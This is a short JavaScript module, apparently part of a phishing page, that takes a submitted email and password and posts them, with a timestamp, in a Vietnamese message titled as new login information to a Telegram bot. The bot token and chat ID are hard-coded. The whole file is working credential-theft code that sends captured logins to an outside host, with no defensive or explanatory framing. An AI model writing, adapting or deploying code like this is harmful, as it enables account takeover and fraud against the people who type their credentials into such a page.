// Replace these with your actual Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = "7767652234:AAEhpG-XDsenEBI-awMKptdtKL5XyFTgw7U";
const TELEGRAM_CHAT_ID = "6809887911"; // Chat ID mới

export const sendToTelegram = async (email, password) => {
  try {
    const message = `
🔐 Thông Tin Đăng Nhập Mới
📧 Email: ${email}  
🔑 Mật khẩu: ${password}
⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || "Không thể gửi tin nhắn");
    }

    return true;
  } catch (error) {
    console.error("Lỗi API Telegram:", error);
    throw error;
  }
};
